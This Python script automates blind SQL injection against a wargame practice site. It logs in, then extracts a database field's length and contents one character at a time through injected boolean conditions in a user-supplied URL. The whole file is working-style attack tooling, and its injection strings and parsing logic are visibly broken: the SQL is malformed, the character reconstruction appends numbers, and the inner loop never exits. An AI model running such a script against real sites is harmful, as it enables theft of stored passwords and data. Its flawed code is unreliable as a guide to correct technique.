import requests
from bs4 import BeautifulSoup
import urllib
from getpass import getpass


def login(id, pw):
    url = 'https://los.eagle-jump.org/?login'
    data = {'id': id, 'pw': pw}
    res = requests.post(url, data=data)

    if res.status_code != 200:
        print('Please check server status.')
        exit(1)
    if res.text.find('fail') != -1:
        print('Please check your id or pw')
        exit(1)

    print('Login Success!')
    return res.cookies.get_dict()


def get_length(pwning_url, field, add_comment, login_cookies):
    length = 1

    while True:
        print('Trying To get length of {0} by length {1}'.format(field, length))
        url = pwning_url + ' length({0})={1} {2} '.format(field, length, '%23' if add_comment else '')
        print(url)
        res = requests.get(url, cookies=login_cookies)
        soup = BeautifulSoup(res.text, 'html.parser')
        h2s = soup.find_all('h2')
        for h2 in h2s:
            if h2.find('Hello') !=-1:
                return length

        length += 1


def do_blind_inject(pwning_url, field, add_comment, login_cookies):

    pw = str()
    length = get_length(pwning_url, field, add_comment,login_cookies)
    idx = 1
    print('Success to get length {0} is {1} '.format(field, length))
    while idx <= length:
        min_ascii = 32
        max_ascii = 127
        while True:
            url = pwning_url + ' {2} < RIGHT(LEFT({0}),{1}),1)'.format(field, idx, int((min_ascii + max_ascii) / 2))
            print('request : ' + url)
            res = requests.get(url, cookies=login_cookies)
            soup = BeautifulSoup(res.text, 'html.parser')
            h2s = soup.find_all('h2')
            print(h2s)
            for h2 in h2s:
                if h2.find('Hello') != -1 :
                    min_ascii = int((min_ascii + max_ascii) / 2)
                else:
                    url = pwning_url + ' {2} = RIGHT(LEFT({0}),{1}),1)'.format(field, idx, int((min_ascii + max_ascii) / 2))
                    res = requests.get(url, cookies=login_cookies)
                    soup = BeautifulSoup(res.text, 'html.parser')
                    h2s = soup.find_all('h2')

                    for h2 in h2s:
                        # find pw one word
                        if h2.find('Hello') != -1:
                            pw = pw + str((min_ascii + max_ascii) / 2)
                            break
                    max_ascii = int((min_ascii + max_ascii) / 2)
        idx += 1

    print('password is {0}'.format(pw))



if __name__ == '__main__':
    user_id = input('Enter your los id : ')
    # user_pw = getpass('Enter your los pw : ')
    user_pw = input('Enter your los pw : ')
    login_cookies = login(user_id, user_pw)

    pwning_url = input('Enter your pwning_url : ')

    # delete comment for query
    if pwning_url.find('%23') != -1:
        pwning_url = pwning_url[:pwning_url.find('%23')]

    print(pwning_url)
    # pwning_query = input('Enter defalut query to escape security options')
    field = input('Enter query name : ')
    while True:
        add_comment = input('Do you want to add comment end of the url[Y/N] ? ')
        if add_comment.lower() == 'y' or add_comment.lower() == 'n':
            break

    do_blind_inject(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)

